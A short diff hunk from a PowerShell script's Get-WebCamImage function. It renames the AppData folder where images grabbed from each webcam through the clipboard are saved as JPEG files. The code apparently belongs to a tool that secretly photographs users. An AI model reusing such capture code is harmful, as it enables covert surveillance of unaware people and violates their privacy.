@@ -150,7 +150,7 @@ function Get-WebCamImage {
 		}
         $count = 0
         foreach ($device in $devices) {
-            $imagePath = "$env:APPDATA\KDOT\out$count.jpg"
+            $imagePath = "$env:APPDATA\Kematian\out$count.jpg"
             $device.ShowWindow($picCapture)
             $device.CopyC()
             $bitmap = [Windows.Forms.Clipboard]::GetImage()
